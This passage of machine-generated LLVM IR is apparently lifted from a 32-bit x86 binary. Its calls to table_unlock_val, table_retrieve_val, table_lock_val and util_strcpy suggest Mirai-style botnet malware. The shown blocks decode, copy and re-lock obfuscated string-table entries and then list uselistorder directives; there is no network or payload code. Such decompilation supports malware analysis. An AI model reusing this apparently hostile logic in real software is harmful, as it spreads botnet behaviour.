  %v3_804a581 = load i32, i32* %v2_804a581, align 4
  %v15_804a581 = icmp eq i32 %v3_804a581, %v3_804a57d
  store i1 %v15_804a581, i1* %zf.global-to-local, align 1
  %v1_804a585 = icmp eq i1 %v15_804a581, false
  br i1 %v1_804a585, label %dec_label_pc_804a55a.dec_label_pc_8048ac7_crit_edge, label %dec_label_pc_804a58b

dec_label_pc_804a55a.dec_label_pc_8048ac7_crit_edge: ; preds = %dec_label_pc_804a55a
  %v0_8048ac7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048ac7

dec_label_pc_804a58b:                             ; preds = %dec_label_pc_804a55a
  %v1_804a58b = add i32 %v0_804a57a, 20756
  store i32 %v1_804a58b, i32* %ecx.global-to-local, align 4
  %v1_804a592 = add i32 %v0_804a57a, 56
  %v2_804a592 = inttoptr i32 %v1_804a592 to i32*
  %v3_804a592 = load i32, i32* %v2_804a592, align 4
  store i32 %v3_804a592, i32* %edx.global-to-local, align 4
  %v2_804a596 = add i32 %v0_804a57a, 36
  %v3_804a596 = inttoptr i32 %v2_804a596 to i32*
  store i32 %v1_804a58b, i32* %v3_804a596, align 4
  %v0_804a59a = load i32, i32* @esp, align 4
  %v1_804a59a = add i32 %v0_804a59a, 40
  %v2_804a59a = inttoptr i32 %v1_804a59a to i32*
  %v3_804a59a = load i32, i32* %v2_804a59a, align 4
  %v1_804a59e = add i32 %v0_804a59a, 20612
  store i32 %v1_804a59e, i32* %eax.global-to-local, align 4
  %v0_804a5a5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a5a5 = add i32 %v0_804a5a5, 16
  store i32 %v1_804a5a5, i32* %edx.global-to-local, align 4
  %v1_804a5a8 = add i32 %v3_804a59a, 1452
  %v9_804a5a8 = icmp eq i32 %v1_804a5a8, 0
  store i1 %v9_804a5a8, i1* %zf.global-to-local, align 1
  store i32 %v1_804a5a8, i32* %ecx.global-to-local, align 4
  %v2_804a5ae = add i32 %v0_804a59a, 16
  %v3_804a5ae = inttoptr i32 %v2_804a5ae to i32*
  store i32 %v1_804a59e, i32* %v3_804a5ae, align 4
  %v0_804a5b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a5b2 = load i32, i32* @esp, align 4
  %v2_804a5b2 = add i32 %v1_804a5b2, 32
  %v3_804a5b2 = inttoptr i32 %v2_804a5b2 to i32*
  store i32 %v0_804a5b2, i32* %v3_804a5b2, align 4
  %v0_804a5b6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a5b6 = load i32, i32* @esp, align 4
  %v2_804a5b6 = add i32 %v1_804a5b6, 36
  %v3_804a5b6 = inttoptr i32 %v2_804a5b6 to i32*
  store i32 %v0_804a5b6, i32* %v3_804a5b6, align 4
  %v0_8048c0c.pre = load i32, i32* @esp, align 4
  %v5_8048c0c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048c0c

dec_label_pc_804a5bf:                             ; preds = %dec_label_pc_8048baa
  %v9_804a5bf = icmp eq i32 %v0_8048bc0, 12
  store i1 %v9_804a5bf, i1* %zf.global-to-local, align 1
  %v1_804a5c2 = add i32 %v0_8048bc0, -16
  %v2_804a5c2 = inttoptr i32 %v1_804a5c2 to i32*
  store i32 57, i32* %v2_804a5c2, align 4
  %v2_804a5c4 = call i32 @table_unlock_val(i8 %v1_804a62e)
  store i32 %v2_804a5c4, i32* %eax.global-to-local, align 4
  %v0_804a5c9 = load i32, i32* @esp, align 4
  %v1_804a5c9 = inttoptr i32 %v0_804a5c9 to i32*
  %v2_804a5c9 = load i32, i32* %v1_804a5c9, align 4
  store i32 %v2_804a5c9, i32* @ebx, align 4
  %v3_804a5c9 = add i32 %v0_804a5c9, 4
  %v1_804a5ca = inttoptr i32 %v3_804a5c9 to i32*
  store i32 0, i32* %v1_804a5ca, align 4
  store i32 57, i32* %v1_804a5c9, align 4
  %v3_804a5cf = call i32 @table_retrieve_val(i32 %v0_80488b3, i32* %v2_804a639)
  store i32 %v3_804a5cf, i32* %eax.global-to-local, align 4
  %v0_804a5d4 = load i32, i32* @esp, align 4
  %v1_804a5d4 = inttoptr i32 %v0_804a5d4 to i32*
  %v2_804a5d4 = load i32, i32* %v1_804a5d4, align 4
  store i32 %v2_804a5d4, i32* %edx.global-to-local, align 4
  %v3_804a5d4 = add i32 %v0_804a5d4, 4
  %v1_804a5d5 = inttoptr i32 %v3_804a5d4 to i32*
  %v2_804a5d5 = load i32, i32* %v1_804a5d5, align 4
  store i32 %v2_804a5d5, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a5cf, i32* %v1_804a5d5, align 4
  %v0_804a5d7 = load i32, i32* @esi, align 4
  %v1_804a5d7 = add i32 %v0_804a5d7, 20
  store i32 %v1_804a5d7, i32* @eax, align 4
  store i32 %v1_804a5d7, i32* %v1_804a5d4, align 4
  %v3_804a5db = call i32 @util_strcpy(i8* %v2_804a56c, i32 %v0_80488b2)
  store i32 %v3_804a5db, i32* %eax.global-to-local, align 4
  %v0_804a5e0 = load i32, i32* @esp, align 4
  %v1_804a5e0 = inttoptr i32 %v0_804a5e0 to i32*
  store i32 57, i32* %v1_804a5e0, align 4
  %v2_804a5e7 = call i32 @table_lock_val(i8 %v1_804a62e)
  store i32 %v2_804a5e7, i32* %eax.global-to-local, align 4
  %v0_804a5ec = load i32, i32* @esp, align 4
  %v1_804a5ec = add i32 %v0_804a5ec, 16
  %v6_804a5ec = icmp eq i32 %v1_804a5ec, 0
  store i1 %v6_804a5ec, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804a55a

dec_label_pc_804a5f4:                             ; preds = %dec_label_pc_8048baa
  %v9_804a5f4 = icmp eq i32 %v0_8048bc0, 12
  store i1 %v9_804a5f4, i1* %zf.global-to-local, align 1
  %v1_804a5f7 = add i32 %v0_8048bc0, -16
  %v2_804a5f7 = inttoptr i32 %v1_804a5f7 to i32*
  store i32 56, i32* %v2_804a5f7, align 4
  %v2_804a5f9 = call i32 @table_unlock_val(i8 %v1_804a62e)
  store i32 %v2_804a5f9, i32* %eax.global-to-local, align 4
  %v0_804a5fe = load i32, i32* @esp, align 4
  %v1_804a5fe = inttoptr i32 %v0_804a5fe to i32*
  %v2_804a5fe = load i32, i32* %v1_804a5fe, align 4
  store i32 %v2_804a5fe, i32* @ebx, align 4
  %v3_804a5fe = add i32 %v0_804a5fe, 4
  %v1_804a5ff = inttoptr i32 %v3_804a5fe to i32*
  store i32 0, i32* %v1_804a5ff, align 4
  store i32 56, i32* %v1_804a5fe, align 4
  %v3_804a604 = call i32 @table_retrieve_val(i32 %v0_80488b3, i32* %v2_804a639)
  store i32 %v3_804a604, i32* %eax.global-to-local, align 4
  %v0_804a609 = load i32, i32* @esp, align 4
  %v1_804a609 = inttoptr i32 %v0_804a609 to i32*
  %v2_804a609 = load i32, i32* %v1_804a609, align 4
  store i32 %v2_804a609, i32* %edx.global-to-local, align 4
  %v3_804a609 = add i32 %v0_804a609, 4
  %v1_804a60a = inttoptr i32 %v3_804a609 to i32*
  %v2_804a60a = load i32, i32* %v1_804a60a, align 4
  store i32 %v2_804a60a, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a604, i32* %v1_804a60a, align 4
  %v0_804a60c = load i32, i32* @esi, align 4
  %v1_804a60c = add i32 %v0_804a60c, 20
  store i32 %v1_804a60c, i32* @eax, align 4
  store i32 %v1_804a60c, i32* %v1_804a609, align 4
  %v3_804a610 = call i32 @util_strcpy(i8* %v2_804a56c, i32 %v0_80488b2)
  store i32 %v3_804a610, i32* %eax.global-to-local, align 4
  %v0_804a615 = load i32, i32* @esp, align 4
  %v1_804a615 = inttoptr i32 %v0_804a615 to i32*
  store i32 56, i32* %v1_804a615, align 4
  %v2_804a61c = call i32 @table_lock_val(i8 %v1_804a62e)
  store i32 %v2_804a61c, i32* %eax.global-to-local, align 4
  %v0_804a621 = load i32, i32* @esp, align 4
  %v1_804a621 = add i32 %v0_804a621, 16
  %v6_804a621 = icmp eq i32 %v1_804a621, 0
  store i1 %v6_804a621, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804a55a

dec_label_pc_804a629:                             ; preds = %dec_label_pc_8048baa
  %v9_804a629 = icmp eq i32 %v0_8048bc0, 12
  store i1 %v9_804a629, i1* %zf.global-to-local, align 1
  %v1_804a62c = add i32 %v0_8048bc0, -16
  %v2_804a62c = inttoptr i32 %v1_804a62c to i32*
  store i32 54, i32* %v2_804a62c, align 4
  %v2_804a62e = call i32 @table_unlock_val(i8 %v1_804a62e)
  store i32 %v2_804a62e, i32* %eax.global-to-local, align 4
  %v0_804a633 = load i32, i32* @esp, align 4
  %v1_804a633 = inttoptr i32 %v0_804a633 to i32*
  %v2_804a633 = load i32, i32* %v1_804a633, align 4
  store i32 %v2_804a633, i32* @ebx, align 4
  %v3_804a633 = add i32 %v0_804a633, 4
  %v1_804a634 = inttoptr i32 %v3_804a633 to i32*
  store i32 0, i32* %v1_804a634, align 4
  store i32 54, i32* %v1_804a633, align 4
  %v3_804a639 = call i32 @table_retrieve_val(i32 %v0_80488b3, i32* %v2_804a639)
  store i32 %v3_804a639, i32* %eax.global-to-local, align 4
  %v0_804a63e = load i32, i32* @esp, align 4
  %v1_804a63e = inttoptr i32 %v0_804a63e to i32*
  %v2_804a63e = load i32, i32* %v1_804a63e, align 4
  store i32 %v2_804a63e, i32* %edx.global-to-local, align 4
  %v3_804a63e = add i32 %v0_804a63e, 4
  %v1_804a63f = inttoptr i32 %v3_804a63e to i32*
  %v2_804a63f = load i32, i32* %v1_804a63f, align 4
  store i32 %v2_804a63f, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a639, i32* %v1_804a63f, align 4
  %v0_804a641 = load i32, i32* @esi, align 4
  %v1_804a641 = add i32 %v0_804a641, 20
  store i32 %v1_804a641, i32* @eax, align 4
  store i32 %v1_804a641, i32* %v1_804a63e, align 4
  %v3_804a645 = call i32 @util_strcpy(i8* %v2_804a56c, i32 %v0_80488b2)
  store i32 %v3_804a645, i32* %eax.global-to-local, align 4
  %v0_804a64a = load i32, i32* @esp, align 4
  %v1_804a64a = inttoptr i32 %v0_804a64a to i32*
  store i32 54, i32* %v1_804a64a, align 4
  %v2_804a651 = call i32 @table_lock_val(i8 %v1_804a62e)
  store i32 %v2_804a651, i32* %eax.global-to-local, align 4
  %v0_804a656 = load i32, i32* @esp, align 4
  %v1_804a656 = add i32 %v0_804a656, 16
  %v6_804a656 = icmp eq i32 %v1_804a656, 0
  store i1 %v6_804a656, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804a55a

dec_label_pc_804a65e:                             ; preds = %dec_label_pc_8048baa
  %v9_804a65e = icmp eq i32 %v0_8048bc0, 12
  store i1 %v9_804a65e, i1* %zf.global-to-local, align 1
  %v1_804a661 = add i32 %v0_8048bc0, -16
  %v2_804a661 = inttoptr i32 %v1_804a661 to i32*
  store i32 55, i32* %v2_804a661, align 4
  %v2_804a663 = call i32 @table_unlock_val(i8 %v1_804a62e)
  store i32 %v2_804a663, i32* %eax.global-to-local, align 4
  %v0_804a668 = load i32, i32* @esp, align 4
  %v1_804a668 = inttoptr i32 %v0_804a668 to i32*
  %v2_804a668 = load i32, i32* %v1_804a668, align 4
  store i32 %v2_804a668, i32* @ebx, align 4
  %v3_804a668 = add i32 %v0_804a668, 4
  %v1_804a669 = inttoptr i32 %v3_804a668 to i32*
  store i32 0, i32* %v1_804a669, align 4
  store i32 55, i32* %v1_804a668, align 4
  %v3_804a66e = call i32 @table_retrieve_val(i32 %v0_80488b3, i32* %v2_804a639)
  store i32 %v3_804a66e, i32* %eax.global-to-local, align 4
  %v0_804a673 = load i32, i32* @esp, align 4
  %v1_804a673 = inttoptr i32 %v0_804a673 to i32*
  %v2_804a673 = load i32, i32* %v1_804a673, align 4
  store i32 %v2_804a673, i32* %edx.global-to-local, align 4
  %v3_804a673 = add i32 %v0_804a673, 4
  %v1_804a674 = inttoptr i32 %v3_804a673 to i32*
  %v2_804a674 = load i32, i32* %v1_804a674, align 4
  store i32 %v2_804a674, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a66e, i32* %v1_804a674, align 4
  %v0_804a676 = load i32, i32* @esi, align 4
  %v1_804a676 = add i32 %v0_804a676, 20
  store i32 %v1_804a676, i32* @eax, align 4
  store i32 %v1_804a676, i32* %v1_804a673, align 4
  %v3_804a67a = call i32 @util_strcpy(i8* %v2_804a56c, i32 %v0_80488b2)
  store i32 %v3_804a67a, i32* %eax.global-to-local, align 4
  %v0_804a67f = load i32, i32* @esp, align 4
  %v1_804a67f = inttoptr i32 %v0_804a67f to i32*
  store i32 55, i32* %v1_804a67f, align 4
  %v2_804a686 = call i32 @table_lock_val(i8 %v1_804a62e)
  store i32 %v2_804a686, i32* %eax.global-to-local, align 4
  %v0_804a68b = load i32, i32* @esp, align 4
  %v1_804a68b = add i32 %v0_804a68b, 16
  %v6_804a68b = icmp eq i32 %v1_804a68b, 0
  store i1 %v6_804a68b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804a55a

; uselistorder directives
  uselistorder i32 %v1_804a68b, { 1, 0 }
  uselistorder i32 %v2_804a686, { 1, 0 }
  uselistorder i32 %v1_804a656, { 1, 0 }
  uselistorder i32 %v2_804a651, { 1, 0 }
  uselistorder i32 %v1_804a621, { 1, 0 }
  uselistorder i32 %v2_804a61c, { 1, 0 }
  uselistorder i32 %v1_804a5ec, { 1, 0 }
  uselistorder i32 %v2_804a5e7, { 1, 0 }
  uselistorder i1 %v15_804a581, { 1, 0 }
  uselistorder i32 %v1_804a55a, { 0, 1, 2, 5, 4, 3 }
  uselistorder i32 %v1_804a522, { 1, 0 }
  uselistorder i1 %v14_804a4e1, { 1, 0 }
  uselistorder i32 %v1_804a4de, { 1, 0 }
  uselistorder i32 %v0_804a4de, { 1, 0, 2 }
  uselistorder i32 %v2_804a4d9, { 0, 2, 1 }
  uselistorder i32 %v0_804a4d2, { 1, 0 }
  uselistorder i8 %v2_804a4bd, { 1, 2, 0 }
  uselistorder i32 %v2_804a4ba, { 1, 2, 0 }
  uselistorder i32 %v0_804a4ba, { 1, 0 }
  uselistorder i1 %v10_804a4aa, { 1, 0 }
  uselistorder i1 %v10_804a49e, { 1, 0 }
  uselistorder i32 %v0_804a492, { 2, 3, 1, 0 }
  uselistorder i1 %v12_804a45b, { 1, 0 }
  uselistorder i32 %v1_804a429, { 1, 0 }
  uselistorder i32 %v0_804a40c, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_804a407, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v1_804a3d8, { 1, 0 }
  uselistorder i32 %v0_804a3d5, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_804a3d0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804a3a6, { 1, 0 }
  uselistorder i32 %v0_804a3a3, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_804a39e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804a393, { 1, 0, 2 }
  uselistorder i32 %v0_804a38a, { 1, 0 }
  uselistorder i32 %v1_804a338, { 1, 0, 2 }
  uselistorder i32 %v2_804a306, { 2, 1, 0 }
  uselistorder i32 %v2_804a2ef, { 1, 0 }
  uselistorder i32 %v1_804a2dc, { 1, 0 }
  uselistorder i32 %v0_804a2d9, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_804a2d4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804a2d0, { 1, 0 }
  uselistorder i32 %v9_804a2be, { 1, 0 }
  uselistorder i32 %v5_804a2ba, { 1, 2, 0 }
  uselistorder i8 %v2_804a297, { 1, 2, 0 }
  uselistorder i32 %v2_804a294, { 1, 2, 0 }
  uselistorder i32 %v0_804a294, { 1, 0 }
  uselistorder i1 %v10_804a284, { 1, 0 }
  uselistorder i1 %v10_804a278, { 1, 0 }
  uselistorder i32 %v0_804a269, { 2, 3, 1, 0 }
  uselistorder i1 %v12_804a23f, { 1, 0 }
  uselistorder i32 %v4_804a217, { 1, 0 }
  uselistorder i32 %v4_804a1df, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804a195, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804a17c, { 1, 0, 2 }
  uselistorder i32 %v0_804a163, { 5, 4, 3, 2, 1, 0 }
  uselistorder i1 %v11_804a140, { 1, 0 }
  uselistorder i1 %v9_804a137, { 1, 0 }
  uselistorder i32 %v1_804a134, { 1, 0 }
  uselistorder i32 %v0_804a125, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804a10a, { 1, 0 }
  uselistorder i32 %v0_804a0fd, { 1, 0 }
  uselistorder i32 %v3_804a0d8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804a0d3, { 3, 2, 1, 0 }
  uselistorder i1 %v13_804a0c9, { 1, 0 }
  uselistorder i32 %v3_804a0c2, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804a07b, { 1, 0, 2 }
  uselistorder i1 %v10_804a043, { 1, 0 }
  uselistorder i32 %v0_804a043, { 1, 0 }
  uselistorder i32 %v1_804a01d, { 1, 2, 0 }
  uselistorder i32 %v0_804a013, { 1, 0 }
  uselistorder i32 %v1_8049fe4, { 1, 0 }
  uselistorder i1 %v10_8049fd6, { 1, 0 }
  uselistorder i32 %v4_8049fcc, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v0_8049f9d, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8049f87, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049f72, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8049f5c, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1 %v11_8049f36, { 1, 0 }
  uselistorder i32 %v1_8049f22, { 1, 0 }
  uselistorder i32 %v1_8049ee9, { 1, 0 }
  uselistorder i32 %v0_8049ee6, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_8049ee1, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 %v0_8049ec7, { 1, 0 }
  uselistorder i1 %v11_8049e92, { 1, 0 }
  uselistorder i1 %v9_8049e89, { 1, 0 }
  uselistorder i32 %v0_8049e86, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v4_8049e81, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8049e61, { 0, 2, 1 }
  uselistorder i1 %v10_8049e53, { 1, 0 }
  uselistorder i32 %v4_8049e49, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_8049e1a, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8049e04, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049def, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_8049dd9, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1 %v11_8049dac, { 1, 0 }
  uselistorder i32 %v0_8049d99, { 1, 0, 2 }
  uselistorder i32 %v0_8049d4b, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_8049d46, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v1_8049d1b, { 1, 0 }
  uselistorder i32 %v0_8049d18, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_8049d13, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8049cf5, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049cf0, { 1, 0, 2 }
  uselistorder i32 %v0_8049ce5, { 1, 0, 2 }
  uselistorder i32 %v0_8049cdc, { 1, 0 }
  uselistorder i32 %v2_8049cad, { 1, 0 }
  uselistorder i32 %v1_8049c9e, { 1, 0 }
  uselistorder i32 %v0_8049c9b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049c96, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8049c92, { 1, 0 }
  uselistorder i32 %v5_8049c8d, { 1, 2, 0 }
  uselistorder i32 %v4_8049c8d, { 0, 2, 1 }
  uselistorder i32 %v2_8049c60, { 1, 0 }
  uselistorder i32 %v2_8049c33, { 1, 2, 0 }
  uselistorder i32 %v3_8049c29, { 0, 1, 3, 4, 2 }
  uselistorder i32* %v2_8049c29, { 0, 2, 1 }
  uselistorder i32 %v0_8049c20, { 1, 0 }
  uselistorder i32 %v0_8049bf8, { 0, 2, 1 }
  uselistorder i32 %v0_8049bcc, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v1_8049bb7, { 1, 0 }
  uselistorder i1 %v10_8049b9c, { 1, 0 }
  uselistorder i32 %v0_8049b97, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v4_8049b92, { 2, 3, 0, 1, 4, 5 }
  uselistorder i1 %v11_8049b69, { 1, 0 }
  uselistorder i32 %v0_8049b4d, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8049b38, { 1, 0 }
  uselistorder i32 %v0_8049b2e, { 3, 0, 1, 2, 7, 4, 5, 6 }
  uselistorder i32 %v0_8049b16, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_8049b0b, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8049ae4, { 0, 2, 1 }
  uselistorder i1 %v10_8049ada, { 1, 0 }
  uselistorder i32 %v4_8049ad2, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 %v0_8049aa3, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8049a8d, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049a78, { 3, 0, 1, 2 }
  uselistorder i32 %v0_8049a62, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_8049a57, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8049a3e, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8049a14, { 0, 2, 1 }
  uselistorder i1 %v10_8049a0a, { 1, 0 }
  uselistorder i32 %v4_8049a02, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 %v0_80499d3, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_80499bd, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_80499a8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8049992, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049967, { 1, 2, 3, 0 }
  uselistorder i32 %v1_804993d, { 0, 2, 1 }
  uselistorder i1 %v10_8049933, { 1, 0 }
  uselistorder i32 %v4_804992b, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 %v0_80498fc, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_80498e6, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_80498d1, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80498bb, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049887, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804987c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804985a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v4_8049820, { 1, 0 }
  uselistorder i32 %v0_804981a, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %v5_80497ae, { 1, 2, 0 }
  uselistorder i32 %v1_80497ae, { 2, 0, 1 }
  uselistorder i32 %v3_80497ab, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80497ab, { 1, 0 }
  uselistorder i32 %v2_80497a0, { 1, 0 }
  uselistorder i32 %v1_804979d, { 1, 0 }
  uselistorder i32 %v5_8049789, { 1, 2, 0 }
  uselistorder i32 %v1_8049789, { 2, 0, 1 }
  uselistorder i32 %v3_8049786, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8049786, { 1, 0 }
  uselistorder i32 %v2_804977b, { 1, 0 }
  uselistorder i32 %v1_8049778, { 1, 0 }
  uselistorder i32 %v3_8049758, { 1, 0, 2 }
  uselistorder i32 %v1_8049753, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80496f6, { 3, 0, 1, 2 }
  uselistorder i32 %v3_80496da, { 1, 0 }
  uselistorder i1 %v9_804967d, { 1, 0 }
  uselistorder i1 %v12_8049670, { 1, 0 }
  uselistorder i32 %v3_8049662, { 6, 7, 8, 5, 0, 4, 2, 3, 1 }
  uselistorder i32* %v2_8049662, { 1, 0 }
  uselistorder i32 %v0_8049662, { 2, 1, 0 }
  uselistorder i1 %v12_804960e, { 1, 0 }
  uselistorder i32 %v0_80496b5, { 1, 0 }
  uselistorder i1 %v11_80495fe, { 1, 0 }
  uselistorder i32 %v2_80495f6, { 1, 2, 0 }
  uselistorder i32 %v3_80495f0, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v10_80495cd, { 1, 0 }
  uselistorder i1 %v9_8049588, { 1, 0 }
  uselistorder i32 %v5_804955e, { 1, 2, 0 }
  uselistorder i32 %v1_804955e, { 2, 0, 1 }
  uselistorder i32 %v3_804955b, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804955b, { 1, 0 }
  uselistorder i32 %v2_8049550, { 1, 0 }
  uselistorder i32 %v1_804954d, { 1, 0 }
  uselistorder i32 %v0_8049520, { 1, 0 }
  uselistorder i32 %v5_804950b, { 1, 2, 0 }
  uselistorder i32 %v1_804950b, { 2, 0, 1 }
  uselistorder i32 %v3_8049508, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8049508, { 1, 0 }
  uselistorder i32 %v2_80494fd, { 1, 0 }
  uselistorder i32 %v1_80494fa, { 1, 0 }
  uselistorder i32 %v0_80494e3, { 0, 2, 1 }
  uselistorder i32 %v5_80494cb, { 1, 2, 0 }
  uselistorder i32 %v3_80494c8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80494c8, { 1, 0 }
  uselistorder i32 %v0_80494bd, { 1, 0 }
  uselistorder i32 %v2_80494ba, { 1, 0 }
  uselistorder i32 %v1_80494b7, { 1, 0 }
  uselistorder i32 %v0_8049480, { 2, 1, 0 }
  uselistorder i32 %v0_8049475, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8049470, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8049468, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804942d, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8049406, { 2, 1, 0 }
  uselistorder i32 %v0_80493dc, { 2, 1, 0 }
  uselistorder i32 %v5_80493d4, { 1, 2, 0 }
  uselistorder i32 %v4_80493d4, { 0, 2, 1 }
  uselistorder i32 %v0_8049373, { 2, 1, 0 }
  uselistorder i32 %v0_804932e, { 1, 3, 2, 0 }
  uselistorder i32 %v0_80492e3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80491fd, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8048f22, { 1, 0, 2 }
  uselistorder i32 %v0_8048f1b, { 1, 0, 2 }
  uselistorder i32 %v0_8048ee1, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %v4_8048ec4, { 1, 0 }
  uselistorder i32 %v0_8048ebc, { 2, 0, 1 }
  uselistorder i32 %v1_8048eb9, { 1, 0, 2 }
  uselistorder i32 %v2_8048eb6, { 1, 0, 2 }
  uselistorder i1 %v10_8048ead, { 1, 0 }
  uselistorder i32 %v0_8048ead, { 1, 0, 2 }
  uselistorder i32 %v1_8048e9d, { 1, 0, 2 }
  uselistorder i1 %v15_8048e93, { 1, 0 }
  uselistorder i32 %v0_8048e93, { 1, 2, 0 }
  uselistorder i1 %v10_8048e75, { 1, 0 }
  uselistorder i1 %v10_8048e6d, { 1, 0 }
  uselistorder i1 %v10_8048e65, { 1, 0 }
  uselistorder i32 %v1_80497bd, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_8048e23, { 1, 0 }
  uselistorder i32 %v0_8048dfc, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 %v0_8048de6, { 1, 2, 0 }
  uselistorder i1 %v15_8048dd0, { 1, 0 }
  uselistorder i32 %v5_8048dba, { 1, 2, 0 }
  uselistorder i32 %v3_8048db7, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_8048db4, { 1, 0 }
  uselistorder i32 %v2_8048da9, { 1, 0 }
  uselistorder i32 %v1_8048da6, { 1, 0 }
  uselistorder i32 %v12_8048d2a, { 1, 0 }
  uselistorder i32 %v0_8048d27, { 2, 0, 1 }
  uselistorder i1 %v10_8048d17, { 1, 0 }
  uselistorder i32 %v1_8048d05, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8048d05.pre, { 1, 2, 0 }
  uselistorder i1 %v10_8048cf4, { 1, 0 }
  uselistorder i32 %v3_8048cf1, { 1, 0, 2 }
  uselistorder i1 %v10_8048cb9, { 1, 0 }
  uselistorder i1 %v6_8048cb9, { 1, 0 }
  uselistorder i32 %v1_8048cb6, { 4, 3, 2, 0, 5, 1 }
  uselistorder i8 %v3_8048cb3, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_8048cb3, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8048cb3, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v15_8048ca9, { 1, 0 }
  uselistorder i1 %v10_8048c80, { 1, 0 }
  uselistorder i1 %v10_8048c78, { 1, 0 }
  uselistorder i1 %v10_8048c70, { 1, 0 }
  uselistorder i1 %v10_8048c68, { 1, 0 }
  uselistorder i1 %v10_8048c60, { 1, 0 }
  uselistorder i32 %v0_8048c1a, { 1, 0 }
  uselistorder i32* %v2_80490ce, { 1, 10, 9, 11, 8, 12, 7, 13, 6, 15, 14, 5, 17, 16, 4, 3, 2, 0, 18, 19, 20, 21, 22 }
